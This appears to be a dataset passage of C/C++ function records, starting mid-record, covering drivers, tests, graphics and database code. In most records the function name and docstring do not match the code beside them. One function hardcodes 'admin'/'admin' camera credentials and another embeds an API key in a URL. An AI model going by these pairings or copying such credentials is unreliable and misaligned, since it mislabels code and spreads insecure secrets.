PDMTHREADTYPE_EXTERNAL:\\n                rc = pThread->u.Ext.pfnThread(pThread);\\n                break;\\n\\n            default:\\n                AssertMsgFailed((\"%d\\\\n\", pThread->Internal.s.enmType));\\n                rc = VERR_PDM_THREAD_IPE_1;\\n                break;\\n        }\\n        if (RT_FAILURE(rc))\\n            break;\\n\\n        \/*\\n         * If this is a simple thread function, the state will be suspending\\n         * or initializing now. If it isn\\'t we\\'re supposed to terminate.\\n         *\/\\n        if (    pThread->enmState != PDMTHREADSTATE_SUSPENDING\\n            &&  pThread->enmState != PDMTHREADSTATE_INITIALIZING)\\n        {\\n            Assert(pThread->enmState == PDMTHREADSTATE_TERMINATING);\\n            break;\\n        }\\n        rc = PDMR3ThreadIAmSuspending(pThread);\\n        if (RT_FAILURE(rc))\\n            break;\\n        if (pThread->enmState != PDMTHREADSTATE_RESUMING)\\n        {\\n            Assert(pThread->enmState == PDMTHREADSTATE_TERMINATING);\\n            break;\\n        }\\n\\n        rc = PDMR3ThreadIAmRunning(pThread);\\n        if (RT_FAILURE(rc))\\n            break;\\n    }\\n\\n    if (RT_FAILURE(rc))\\n        LogRel((\"PDMThread: Thread \\'%s\\' (%RTthrd) quit unexpectedly with rc=%Rrc.\\\\n\", RTThreadGetName(Thread), Thread, rc));\\n\\n    \/*\\n     * Advance the state to terminating and then on to terminated.\\n     *\/\\n    for (;;)\\n    {\\n        PDMTHREADSTATE enmState = pThread->enmState;\\n        if (    enmState == PDMTHREADSTATE_TERMINATING\\n            ||  pdmR3AtomicCmpXchgState(pThread, PDMTHREADSTATE_TERMINATING, enmState))\\n            break;\\n    }\\n\\n    ASMAtomicXchgSize(&pThread->enmState, PDMTHREADSTATE_TERMINATED);\\n    int rc2 = RTThreadUserSignal(Thread); AssertRC(rc2);\\n\\n    if (   pUVM->pVmm2UserMethods\\n        && pUVM->pVmm2UserMethods->pfnNotifyPdmtTerm)\\n        pUVM->pVmm2UserMethods->pfnNotifyPdmtTerm(pUVM->pVmm2UserMethods, pUVM);\\n    Log((\"PDMThread: Terminating thread %RTthrd \/ %p \/ \\'%s\\': %Rrc\\\\n\", Thread, pThread, RTThreadGetName(Thread), rc));\\n    return rc;\\n}'}","id":3039}
{"content":"{'function_name': 'loop', 'docstring': '\/\/ Wait for the next byte and use value for next iteration', 'code': 'byte serial_getch() {\\n  int ch;\\n  while (Serial.available() == 0) {}\\n  \/\/ read the incoming byte:\\n  ch = Serial.read();\\n  return (byte)(ch & 0xff);\\n}'}","id":3040}
{"content":"{'function_name': 'is_triang', 'docstring': '\/\/ returns 2 -- upzero; 1 -- downzero ; 3 diag ; 0 -- not triang ???', 'code': 'myVector gen_roots(size_t root_num ) {\\n  myVector res(root_num) ;\\n  myPermut yo(2*R_RAD) ;\\n  yo.gen_rand() ;\\n\/\/  cout << yo <<endl ;\\n  for (size_t i=0; i<root_num; i++) {\\n    res[i] = (int)R_RAD - (int)( (yo[i]<R_RAD) ? yo[i] : yo[i] + 1 ) ;\\n  }\\n  return res ;\\n}'}","id":3045}
{"content":"{'function_name': 'TEST_F', 'docstring': '\/\/ should not show any revocation checking errors.', 'code': 'TEST_F(HTTPSOCSPTest, IntermediateResponseOldButStillValid) {\\n  if (!SystemSupportsOCSP()) {\\n    LOG(WARNING) << \"Skipping test because system doesn\\'t support OCSP\";\\n    return;\\n  }\\n\\n  EmbeddedTestServer::ServerCertificateConfig cert_config;\\n  cert_config.intermediate = EmbeddedTestServer::IntermediateType::kInHandshake;\\n  cert_config.ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      {{OCSPRevocationStatus::GOOD,\\n        EmbeddedTestServer::OCSPConfig::SingleResponse::Date::kValid}});\\n  \/\/ Use an OCSP response for the intermediate that would be too old for a leaf\\n  \/\/ cert, but is still valid for an intermediate.\\n  cert_config.intermediate_ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      {{OCSPRevocationStatus::REVOKED,\\n        EmbeddedTestServer::OCSPConfig::SingleResponse::Date::kLong}});\\n\\n  CertStatus cert_status;\\n  DoConnection(cert_config, &cert_status);\\n\\n  EXPECT_EQ(CERT_STATUS_REVOKED, cert_status & CERT_STATUS_ALL_ERRORS);\\n  EXPECT_TRUE(cert_status & CERT_STATUS_REV_CHECKING_ENABLED);\\n}'}","id":3049}
{"content":"{'function_name': 'showHighscore', 'docstring': '\/\/ wait for joystick co come back\\r', 'code': 'void showPlusLife() {\\r\\n  \/\/ lambda function that captures all variable within scope by reference\\r\\n  [&] {\\r\\n    for (int d = 0; d < sizeof(plusLife[0]) - 7; d++) {\\r\\n      for (int col = 0; col < 8; col++) {\\r\\n        wait(messageSpeed);\\r\\n        for (int row = 0; row < 8; row++) {\\r\\n          \/\/ this reads the byte from the PROGMEM aka FLASH MEMORY and displays it on the screen\\r\\n          matrix.setLed(0, row, col, pgm_read_byte(&(plusLife[row][col + d])));\\r\\n        }\\r\\n      }\\r\\n\\r\\n      \/\/ if the joystick is moved, exit the message\\r\\n      if (analogRead(yPin) < joystickDefault.y - joystickThreshold\\r\\n        || analogRead(yPin) > joystickDefault.y + joystickThreshold\\r\\n        || analogRead(xPin) < joystickDefault.x - joystickThreshold\\r\\n        || analogRead(xPin) > joystickDefault.x + joystickThreshold) {\\r\\n        return; \/\/ return the lambda function\\r\\n      }\\r\\n    }\\r\\n  }();\\r\\n\\r\\n  matrix.clearDisplay(0);\\r\\n\\r\\n  \/\/ wait for joystick co come back\\r\\n  while (analogRead(yPin) < joystickDefault.y - joystickThreshold\\r\\n    || analogRead(yPin) > joystickDefault.y + joystickThreshold\\r\\n    || analogRead(xPin) < joystickDefault.x - joystickThreshold\\r\\n    || analogRead(xPin) > joystickDefault.x + joystickThreshold) {\\r\\n  }\\r\\n}'}","id":3051}
{"content":"{'function_name': 'an_score', 'docstring': '\/\/ in the batch, x and y are switched', 'code': 'float nu_matches_chi2_b (char* xseq, char* yseq, BATCH* b_ptr, int b_cnt)\\n{\\n    int i, len;\\n    int xn[4], yn[4];\\n    int evt[5];\\n    float exp[5];\\n    float diff, chi2;\\n\\n    \/\/reset nucleotide composition and event count\\n    for (i = 0; i < 4; i++)\\n        xn[i] = 0, yn[i] = 0, evt[i] = 0;\\n\\n    \/\/calculate nucleotide composition and match count\\n    for (len = 0, evt[4] = 0; b_cnt > 0; b_cnt--, len += b_ptr->len, b_ptr++)\\n        for (i = 0; i < b_ptr->len; i++)\\n        {\\n            int xb = get_base(xseq, b_ptr->xpos + i);\\n            int yb = get_base(yseq, b_ptr->ypos + i);\\n            xn[xb]++, yn[yb]++;\\n            if (xb == yb) evt[xb]++, evt[4]--;\\n        }\\n    evt[4] += len;\\n\\n    if (len == 0) return 0.;\\n\\n    \/\/calculate expected event counts based on nucleotide composition\\n    for (i = 0, exp[4] = (float) len; i < 4; i++)\\n    {\\n        exp[i] = (float) xn[i] * yn[i] \/ len;\\n        exp[4] -= exp[i];\\n    }\\n\\n    \/\/calculate chi^2\\n    \/\/direct form: chi2 = sum{1..k} ((Ys - nPs) ^ 2 \/ nPs)\\n    for (i = 0, chi2 = 0.; i < 5; i++)\\n        if (exp[i] > 0.)\\n        {\\n            diff = exp[i] - evt[i];\\n            chi2 += diff * diff \/ exp[i];\\n        }\\n\\n    return chi2;\\n}'}","id":3054}
{"content":"{'function_name': 'precomp_binexpo', 'docstring': '\/\/ precomp a^2,a^4,...a^n\\r', 'code': 'T binexpo(T &a, ll n) {\\r\\n    expval[0] = a;\\r\\n\\tvector <ll> pvec;\\r\\n\\t\/\/ cout << \"Binexpo\" << endl;\\r\\n\\twhile (n != 0) {\\r\\n\\t\\t\/\/ cout << \"n: \" << n << endl;\\r\\n\\t\\tll pow2 = (ll)log2(n);\\r\\n\\t\\tn -= pow(2, pow2);\\r\\n\\t\\t\/\/ cout << \"pow2: \" << pow2 << endl;\\r\\n\\t\\tpvec.push_back(pow2);\\r\\n\\t}\\r\\n\\tvector< vector<ll> > res = expval[pvec[0]];\\r\\n\\tfor (ll i = 1; i < pvec.size(); i++)\\r\\n\\t\\tres = matmul(res, expval[pvec[i]]);\\r\\n\\treturn res;\\r\\n}'}","id":3056}
{"content":"{'function_name': 'decode', 'docstring': '\/\/ The end of this function is unreachable.', 'code': 'data_view decode(msgpack::overlay& objects, const type& t) {\\n  \/\/ Dispatch to the more specific decode.\\n  return caf::visit(\\n    [&](auto&& x) { return decode(objects, std::forward<decltype(x)>(x)); }, t);\\n}'}","id":3057}
{"content":"{'function_name': 'MimeOleCreateSecurity', 'docstring': '\/\/ Done\\r', 'code': 'MIMEOLEAPI MimeOleCreateMessageParts(IMimeMessageParts **ppParts)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT         hr=S_OK;\\r\\n    CMimeMessageParts *pParts=NULL;\\r\\n\\r\\n    \/\/ check params\\r\\n    if (NULL == ppParts)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Init\\r\\n    *ppParts = NULL;\\r\\n\\r\\n    \/\/ Allocate Message Parts\\r\\n    pParts = new CMimeMessageParts;\\r\\n    if (NULL == pParts)\\r\\n    {\\r\\n        hr = TrapError(E_OUTOFMEMORY);\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Success\\r\\n    *ppParts = pParts;\\r\\n    (*ppParts)->AddRef();\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    SafeRelease(pParts);\\r\\n\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":3058}
{"content":"{'function_name': 'log_console_setlogmask', 'docstring': '\/* POSIX definition for 0 mask *\/', 'code': 'void log_console(int priority, const char *format, va_list arg)\\n{\\n\/\/  va_list arglist;\\n  const char *loglevel;\\n\/\/  va_start(arglist, format);\\n\\n  \/* Return on MASKed log priorities *\/\\n  if (!(LOG_MASK(priority) & log_consolemask))\\n    return;\\n\\n  switch(priority)\\n  {\\n  case LOG_EMERG:\\n    loglevel = \"EMERG: \";\\n    break;\\n  case LOG_ALERT:\\n    loglevel = \"ALERT: \";\\n    break;\\n  case LOG_CRIT:\\n    loglevel = \"CRIT: \";\\n    break;\\n  case LOG_ERR:\\n    loglevel = \"ERR: \";\\n    break;\\n  case LOG_WARNING:\\n    loglevel = \"WARNING: \";\\n    break;\\n  case LOG_NOTICE:\\n    loglevel = \"NOTICE: \";\\n    break;\\n  case LOG_INFO:\\n    loglevel = \"INFO: \";\\n    break;\\n  case LOG_DEBUG:\\n    loglevel = \"DEBUG: \";\\n    break;\\n  default:\\n    loglevel = \"UNKNOWN: \";\\n    break;\\n  }\\n\\n  printf(\" %s\", loglevel);\\n  vprintf(format, arg);\\n  printf(\"\\\\n\");\\n  fflush(stdout);\\n  \/\/va_end(arglist);\\n}'}","id":3061}
{"content":"{'function_name': 'TransformImage_NV12', 'docstring': '\/\/ black', 'code': 'LONG GetDefaultStride(IMFMediaType *pType)\\n{\\n    LONG lStride = 0;\\n\\n    \/\/ Try to get the default stride from the media type.\\n    if (FAILED(pType->GetUINT32(MF_MT_DEFAULT_STRIDE, (UINT32*)&lStride)))\\n    {\\n        \/\/ Attribute not set. Try to calculate the default stride.\\n        GUID subtype = GUID_NULL;\\n\\n        UINT32 width = 0;\\n        UINT32 height = 0;\\n\\n        \/\/ Get the subtype and the image size.\\n        ThrowIfError(pType->GetGUID(MF_MT_SUBTYPE, &subtype));\\n        ThrowIfError(MFGetAttributeSize(pType, MF_MT_FRAME_SIZE, &width, &height));\\n        if (subtype == MFVideoFormat_NV12)\\n        {\\n            lStride = width;\\n        }\\n        else if (subtype == MFVideoFormat_YUY2 || subtype == MFVideoFormat_UYVY)\\n        {\\n            lStride = ((width * 2) + 3) & ~3;\\n        }\\n        else\\n        {\\n            throw ref new InvalidArgumentException();\\n        }\\n\\n        \/\/ Set the attribute for later reference.\\n        (void)pType->SetUINT32(MF_MT_DEFAULT_STRIDE, UINT32(lStride));\\n    }\\n\\n    return lStride;\\n}'}","id":3064}
{"content":"{'function_name': 'dfs', 'docstring': '\/\/j=index for which it is called', 'code': 'int main() {\\n\\tll q,n;\\n\\tcin>>q;\\n\\twhile(q--)\\n\\t{\\n\\t\\tcin>>n;\\n\\t\\tfor(i=1;i<=n;i++) cin>>a[i];\\n\\t\\tmemset(b,0,sizeof(b));\\n\\t\\tfor(j=1;j<=n;j++)\\n\\t\\t{\\n\\t\\t\\tif(b[j]==0){w=0,dfs(a[j]);}\\n\\t\\t}\\n\\t\\tfor(i=1;i<=n;i++) cout<<b[i]<<\" \";\\n\\t\\tcout<<endl;\\n\\t\\tmemset(b,0,sizeof(b));\\n\\t\\t\\n\\t}\\n\\t\/\/ your code goes here\\n\\treturn 0;\\n}'}","id":3067}
{"content":"{'function_name': 'vmspace_mapto_dentry', 'docstring': '\/\/ Ensure the range we are mapping does not exceed the inode; if this is the case, we silently truncate', 'code': 'static inline int\\nvmspace_clone_area_must_free(vmarea_t* va, int flags)\\n{\\n\\t\/* Scenario (2) does not free MD-specific parts *\/\\n\\tif ((flags & VMSPACE_CLONE_EXEC) && (va->va_flags & VM_FLAG_MD))\\n\\t\\treturn 0;\\n\\treturn (va->va_flags & VM_FLAG_NO_CLONE) == 0;\\n}'}","id":3068}
{"content":"{'function_name': 'StreamWriteCheckCallback', 'docstring': '\/\/printf(\"StreamWriteCheckCallback\\\\n\");', 'code': 'INT RIVER_CallbackServerFind(SEARCH_SER_INFO *pSearchInfo)\\n{\\n\\tif(pSearchInfo == NULL)\\n\\t{\\n\\t\\tprintf(\"CallbackServerFind: param error\\\\n\");\\n\\t\\treturn -1;\\n\\t}\\n\\t\\n\\t\/\/printf(\"ip = 0x%08lx, port = %d, user = %s, pwd = %s, szDeviceName = %s\\\\n\", pSearchInfo->ipLocal, pSearchInfo->wPortListen, pSearchInfo->userName, pSearchInfo->userPassword, pSearchInfo->szDeviceName);\\n\\tprintf(\"ip = 0x%08lx, port = %d, szDeviceName = %s\\\\n\", pSearchInfo->ipLocal, pSearchInfo->wPortListen, pSearchInfo->szDeviceName);\\n\\t\\n\\tif(1)\\n\\t{\\n\\t\\tipc_node *pNode = (ipc_node *)malloc(sizeof(ipc_node));\\n\\t\\tif(pNode == NULL)\\n\\t\\t{\\n\\t\\t\\tprintf(\"Not enough space to save new ipc info.\\\\n\");\\n\\t\\t\\treturn -1;\\n\\t\\t}\\n\\t\\t\\n\\t\\tmemset(pNode, 0, sizeof(*pNode));\\n\\t\\tpNode->next = NULL;\\n\\t\\t\\n\\t\\tunsigned char *p = pSearchInfo->macAddr;\\n\\t\\tprintf(\"RIVER IPC mac:(%02x:%02x:%02x:%02x:%02x:%02x),MultiAddr:0x%08lx,port:(%d,%d,%d),\\\\n\",p[0],p[1],p[2],p[3],p[4],p[5],pSearchInfo->ipMultiAddr,pSearchInfo->wPortWeb,pSearchInfo->wPortListen,pSearchInfo->wMultiPort);\\n\\t\\t\\n\\t\\t\/\/strncpy(pNode->ipcam.address, pSearchInfo->szDeviceName, sizeof(pNode->ipcam.address)-1);\\n\\t\\t\/\/memcpy(pNode->ipcam.address, pSearchInfo->macAddr, sizeof(pSearchInfo->macAddr));\\n\\t\\tsprintf(pNode->ipcam.address, \"%02x:%02x:%02x:%02x:%02x:%02x\", p[0],p[1],p[2],p[3],p[4],p[5]);\\n\\t\\t\/\/strcpy(pNode->ipcam.user, pSearchInfo->userName);\\n\\t\\t\/\/strcpy(pNode->ipcam.pwd, pSearchInfo->userPassword);\\n\\t\\tstrcpy(pNode->ipcam.user, \"admin\");\\n\\t\\tstrcpy(pNode->ipcam.pwd, \"admin\");\\n\\t\\tpNode->ipcam.channel_no = 0;\\n\\t\\tpNode->ipcam.enable = 0;\\n\\t\\tpNode->ipcam.ipc_type = IPC_TYPE_720P;\\n\\t\\tpNode->ipcam.protocol_type = PRO_TYPE_RIVER;\\n\\t\\tpNode->ipcam.stream_type = STREAM_TYPE_MAIN;\\n\\t\\tpNode->ipcam.trans_type = TRANS_TYPE_TCP;\\n\\t\\tpNode->ipcam.force_fps = 0;\\n\\t\\tpNode->ipcam.frame_rate = 30;\\n\\t\\tpNode->ipcam.dwIp = htonl(pSearchInfo->ipLocal);\\n\\t\\tpNode->ipcam.wPort = pSearchInfo->wPortListen;\\n\\t\\t\/\/strcpy(pNode->ipcam.uuid, pSearchInfo->szDeviceName);\\n\\t\\tsprintf(pNode->ipcam.uuid, \"%02x:%02x:%02x:%02x:%02x:%02x\", p[0],p[1],p[2],p[3],p[4],p[5]);\\n\\t\\tstrncpy(pNode->ipcam.name, pSearchInfo->szDeviceName, sizeof(pNode->ipcam.name)-1);\\n\\t\\tpNode->ipcam.net_mask = htonl(pSearchInfo->ipSubMask);\\n\\t\\tpNode->ipcam.net_gateway = htonl(pSearchInfo->ipGateway);\\n\\t\\tpNode->ipcam.dns1 = htonl(pSearchInfo->ipDnsAddr);\\n\\t\\tpNode->ipcam.dns2 = inet_addr(\"4.4.4.4\");\\n\\t\\t\\n\\t\\triver_unit *pRiverUnit = (river_unit *)(&pNode->ipcam);\\n\\t\\tpRiverUnit->ipMultiAddr = htonl(pSearchInfo->ipMultiAddr);\\n\\t\\tpRiverUnit->wMultiPort = pSearchInfo->wMultiPort;\\n\\t\\tpRiverUnit->wPortWeb = pSearchInfo->wPortWeb;\\n\\t\\tmemcpy(pRiverUnit->macAddr, pSearchInfo->macAddr, sizeof(pRiverUnit->macAddr));\\n\\t\\t\\n\\t\\tif(g_river_head == NULL)\\n\\t\\t{\\n\\t\\t\\tg_river_head = pNode;\\n\\t\\t\\tg_river_tail = pNode;\\n\\t\\t}\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tg_river_tail->next = pNode;\\n\\t\\t\\tg_river_tail = pNode;\\n\\t\\t}\\n\\t}\\n\\t\\n\\treturn 0;\\n}'}","id":3070}
{"content":"{'function_name': 'make_string', 'docstring': '\/\/ Note showbase affects the behavior of \/integer\/ output;', 'code': 'inline auto make_memory_string(void const* item, std::size_t size) -> std::string {\\n\\t\/\/ reverse order for little endian architectures:\\n\\n\\tauto is_little_endian = [] {\\n\\t\\tunion U {\\n\\t\\t\\tint i = 1;\\n\\t\\t\\tchar c[sizeof(int)];\\n\\t\\t};\\n\\n\\t\\treturn 1 != U{}.c[sizeof(int) - 1];\\n\\t};\\n\\n\\tint i = 0, end = static_cast<int>(size), inc = 1;\\n\\n\\tif (is_little_endian()) {\\n\\t\\ti = end - 1;\\n\\t\\tend = inc = -1;\\n\\t}\\n\\n\\tunsigned char const* bytes = static_cast<unsigned char const*>(item);\\n\\n\\tstd::ostringstream os;\\n\\tos << \"0x\" << std::setfill(\\'0\\') << std::hex;\\n\\tfor (; i != end; i += inc) {\\n\\t\\tos << std::setw(2) << static_cast<unsigned>(bytes[i]) << \" \";\\n\\t}\\n\\treturn os.str();\\n}'}","id":3077}
{"content":"{'function_name': 'drawMainPage', 'docstring': '\/\/\u5de6\u4e0b\u89d2\u5750\u6807', 'code': 'void getWeather()\/\/\u4ece\u5fc3\u77e5\u5929\u6c14\u83b7\u53d6\u5929\u6c14\u4fe1\u606f\\n{\\n  Serial.print(\"Try to get weather data from XinZhi: \");\\n  Serial.println(weatherAPI);\\n\\n  if (!client.connect(weatherAPI, 80))\\n  {\\n    Serial.println(\"Connection failed!\");\\n    return;\\n  }\\n\\n  String url = \"\/v3\/weather\/now.json?key=SamSGTUi3hx0dgm1i&location=tianjin&language=zh-Hans&unit=c\";\\n  Serial.print(\"Requesting URL: \");\\n  Serial.println(url);\\n  \/\/\u53d1\u9001\u6570\u636e\u8bf7\u6c42\\n  client.print(String(\"GET \") + url + \"HTTP\/1.1\\\\r\\\\n\" +\\n               \"Host: \" + weatherAPI + \"\\\\r\\\\n\" +\\n               \"Connection: close\\\\r\\\\n\\\\r\\\\n\");\\n  \/\/\u7b49\u5f85\u6570\u636e\u4f20\u9001\u5b8c\\n  delay(100);\\n  String weatherReport;\\n  while (Serial.available()) {\\n    String line = client.readStringUntil(\\'\\\\r\\');\\n    weatherReport += line;\\n  }\\n\\n  client.stop();\\n  Serial.println(\"Get report: \" + weatherReport);\\n  Serial.println(\"Closing connection to XINZHI Weather Api\");\\n\\n  String jsonString;\\n  int jsonIndex;\\n\\n  for (int i = 0; i < weatherReport.length(); i++)\\n  {\\n    if (weatherReport[i] == \\'{\\')\\n    {\\n      jsonIndex = i;\\n      break;\\n    }\\n  }\\n\\n  jsonString = weatherReport.substring(jsonIndex);\\n  Serial.println();\\n  Serial.println(\"Weather Report(in Json) :\");\\n  Serial.println(jsonString);\\n\\n}'}","id":3081}
{"content":"{'function_name': 'denoiseb_rd22_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd23_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd23 read pattern: { denoiseb_update_0[d0, d1] -> raw[2 + 2d0, 1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 965 : -1 <= d0 <= 960 and -1 <= d1 <= 1082; denoiseb_update_0[d0, d1] -> (4 + d0) : d0 = 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_965();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":3084}
{"content":"{'function_name': 'ErrDBICheck200And400', 'docstring': '\/*  check database version, for 200 ulVersion should be 1, for 400 ulVersion is 0x400.\\n    \/**\/', 'code': \"bool FDBIsLVChunkSizeCompatible(\\n    const ULONG cbPage,\\n    const ULONG ulDaeVersion,\\n    const ULONG ulDaeUpdateMajor )\\n\/\/  ================================================================\\n\/\/\\n\/\/  In version 0x620,0x11 of the database the long-value chunk size\\n\/\/  changed, but only for large pages (16kb and 32kb pages). The\\n\/\/  change is _not_ backwards compatible so we have to check for\\n\/\/  the case where we are attaching a database that is older than\\n\/\/  the update.\\n\/\/\\n\/\/-\\n{\\n    \/\/ when the major version changes this function won't be needed\\n    \/\/ any more.\\n    Assert( ulDAEVersionMax == ulDAEVersionNewLVChunk );\\n    Assert( ulDAEUpdateMajorMax >= ulDAEUpdateMajorNewLVChunk );\\n\\n    Assert( 2*1024 == cbPage\\n            || 4*1024 == cbPage\\n            || 8*1024 == cbPage\\n            || 16*1024 == cbPage\\n            || 32*1024 == cbPage );\\n\\n    \/\/ earlier checks should catch these conditions\\n\\n    Assert( ulDAEVersionMax == ulDaeVersion || FNegTest( fInvalidAPIUsage ) || FInEseutilPossibleUsageError() );\\n\\n    if( FIsSmallPage( cbPage ) )\\n    {\\n        \/\/ small pages are always compatible\\n        return true;\\n    }\\n\\n    \/\/ this is a large page database. if it has the\\n    \/\/ old chunk size then it isn't compatible\\n    if( ulDaeVersion == ulDAEVersionNewLVChunk\\n        && ulDaeUpdateMajor < ulDAEUpdateMajorNewLVChunk )\\n    {\\n        return false;\\n    }\\n\\n    return true;\\n}\"}","id":3087}
{"content":"{'function_name': 'win32_common_init', 'docstring': '\/\/ Create helper window', 'code': 'file_scope bool is_contraction_possible(s64 oldSize) {\\n    \/\/ Check if object allocated on low fragmentation heap.\\n    \/\/ The LFH can only allocate blocks up to 16KB in size.\\n    if (oldSize <= 0x4000) {\\n        LONG heapType = -1;\\n        if (!HeapQueryInformation(GetProcessHeap(), HeapCompatibilityInformation, &heapType, sizeof(heapType), null)) {\\n            return false;\\n        }\\n        return heapType != 2;\\n    }\\n\\n    \/\/ Contraction possible for objects not on the LFH\\n    return true;\\n}'}","id":3093}
{"content":"{'function_name': 'BottomPlayerFrame', 'docstring': '\/\/std::cout << bottom << std::endl;', 'code': 'cv::Rect TopPlayerRectEstimation(cv::Mat frame, cv::Ptr<cv::BackgroundSubtractor> gmm) {\\n\\t\\tcvtColor(frame, frame, CV_BGR2GRAY);\\n\\n\\t\\tcv::Mat tpimage = frame.clone();\\n\\n\\t\\t\/\/ >>>>> Noise smoothing\\n\\t\\tcv::GaussianBlur(frame, tpimage, cv::Size(3, 3), 3.0, 3.0);\\n\\t\\t\/\/ <<<<< Noise smoothing\\n\\n\\t\\ttpimage = TopPlayerFrame(tpimage);\\n\\n\\t\\t\/\/ Background Subtraction\\n\\t\\tcv::Mat fgMaskGMM;\\n\\t\\tgmm->apply(tpimage, fgMaskGMM);\\n\\n\\t\\tcv::Mat skinimage;\\n\\t\\t\/\/ shapes for morphology operators kernel\\n\\t\\tcv::Mat element = cv::getStructuringElement(cv::MORPH_ELLIPSE, cv::Size(3, 3));\\n\\t\\tcv::dilate(fgMaskGMM, skinimage, element, cv::Point(-1, -1), 2, 1, 1);\\n\\t\\tcv::erode(skinimage, skinimage, element, cv::Point(-1, -1), 2, 1, 1);\\n\\n\\t\\t\/\/ Find contours\\n\\t\\tcv::Mat contourimage;\\n\\t\\tcontourimage = skinimage.clone();\\n\\t\\tstd::vector<std::vector<cv::Point>> contours;\\n\\t\\tstd::vector<cv::Vec4i> hierarchy;\\n\\t\\tfindContours(contourimage, contours, hierarchy, CV_RETR_EXTERNAL, CV_CHAIN_APPROX_SIMPLE, cv::Point(0, 0));\\n\\n\\t\\tcv::Rect up_bounding_rect, up_bounding_rect2(tpimage.cols, tpimage.rows, 0, 0);\\n\\n\\t\\t\/\/\/ Iterate through each contour\\n\\t\\tfor (size_t i = 0; i < contours.size(); i++) {\\n\\t\\t\\t\/\/  Find the area of contour\\n\\t\\t\\tup_bounding_rect = boundingRect(contours[i]);\\n\\t\\t\\tif (up_bounding_rect.y < up_bounding_rect2.y && up_bounding_rect.width > 15 && up_bounding_rect.height > 15) {\\n\\t\\t\\t\\tup_bounding_rect2 = up_bounding_rect;\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\tcv::Scalar color(255, 255, 255);\\n\\n\\t\\t\/\/ Check the size of the bounding box\\n\\t\\tif (up_bounding_rect2.width < 60 && up_bounding_rect2.height < 90) {\\n\\t\\t\\tup_bounding_rect2 = NormalizeTopROI(tpimage, up_bounding_rect2);\\n\\t\\t}\\n\\n\\t\\treturn up_bounding_rect2;\\n\\t}'}","id":3094}
{"content":"{'function_name': 'fill_command', 'docstring': '\/\/\u043f\u043e\u0434\u0441\u0447\u0435\u0442 \u0447\u0435\u0442\u043d\u043e\u0441\u0442\u0438 \u043a\u043e\u043c\u0430\u043d\u0434\u044b (\u0431\u0438\u0442 P)', 'code': 'WORD create_table_lch(LTR114_LCHANNEL ch)\\n{\\n    WORD out = 0;\\n\\n    \/\/\u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d\u0430\\n    if (IS_MODE_R(ch.MeasMode))\\n    {\\n        if (ch.Range >= LTR114_R_RANGEQNT)\\n            return INVALID_CH;\\n        else\\n            out |= (WORD)ch.Range<<10;\\n\\n        if (ch.Range == 0)\\n            out |= 0x40;    \/\/1 \u0434\u043b\u044f \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d\u0430 0-400\\n    }\\n    else\\n    {\\n        switch (ch.Range)\\n        {\\n            case LTR114_URANGE_10: out |= LTR114_GAIN_10<<8; break;\\n            case LTR114_URANGE_2: out |= LTR114_GAIN_2<<8; break;\\n            case LTR114_URANGE_04: out |= LTR114_GAIN_04<<8; break;\\n            default: return INVALID_CH;\\n        }\\n    }\\n    \\n    \/\/\u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u043d\u043e\u043c\u0435\u0440\u0430 \u043a\u0430\u043d\u0430\u043b\u0430\\n    if (IS_MODE_R(ch.MeasMode))\\n    {\\n        if ((ch.Channel < 0)||(ch.Channel > 7))  \/\/\u0434\u043b\u044f \u0441\u043e\u043f\u0440\u043e\\n            return INVALID_CH;\\n        else out |= ch.Channel;\\n    }\\n\\n    if ((ch.MeasMode == LTR114_MEASMODE_U)||(IS_TEST_MODE(ch.MeasMode))) \\n    {\\n        if ((ch.Channel < 0) || (ch.Channel > 15))\\n            return INVALID_CH;\\n        else out |= ch.Channel;\\n    }\\n\\n    if ((ch.MeasMode==LTR114_MEASMODE_DAC12_CBR) || (ch.MeasMode==LTR114_MEASMODE_NDAC12_CBR)\\n        || (ch.MeasMode==LTR114_MEASMODE_DAC12_INTR_CBR) || (ch.MeasMode==LTR114_MEASMODE_NDAC12_INTR_CBR))\\n    {\\n        if ((ch.Channel < 8) || (ch.Channel > 15))\\n            return INVALID_CH;\\n        out |= (ch.Channel-8);\\n    }\\n    out |= ch.MeasMode;\\n    return out;\\n}'}","id":3098}
